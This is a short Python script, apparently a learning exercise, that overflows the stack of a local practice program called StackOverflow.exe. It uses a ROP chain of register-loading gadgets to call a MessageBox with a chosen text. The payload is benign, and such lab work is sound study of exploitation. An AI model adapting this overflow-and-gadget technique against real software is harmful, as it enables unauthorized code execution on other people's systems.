import subprocess
import struct

msgbox_addr = 0x0000000000401070
# 找一个纯 ret 指令的地址，比如 vulnerable 结尾的那个
rcx_gadget = 0x0000000000401160
rdx_gadget = 0x0000000000401162
r8_gadget = 0x0000000000401164
r9_gadget = 0x0000000000401167
ret_gadget = 0x00000000004010f5

text_addr=0x0000000000402220

# 24 字节填充 + 8字节对齐跳板 + 8字节目标地址
payload = b"A" * 24
#rop chain
payload+=struct.pack("<Q", ret_gadget)
payload+=struct.pack("<Q", rcx_gadget)
payload+=struct.pack("<Q", 0)
payload+=struct.pack("<Q", rdx_gadget)
payload+=struct.pack("<Q", text_addr)
payload+=struct.pack("<Q", r8_gadget)
payload+=struct.pack("<Q", 0)
payload+=struct.pack("<Q", r9_gadget)
payload+=struct.pack("<Q", 0)

#64bit 与其算16bytes对齐，还不如8bytes硬试

payload+=struct.pack("<Q", msgbox_addr)

p = subprocess.Popen(["StackOverflow.exe"], stdin=subprocess.PIPE)
p.communicate(input=payload)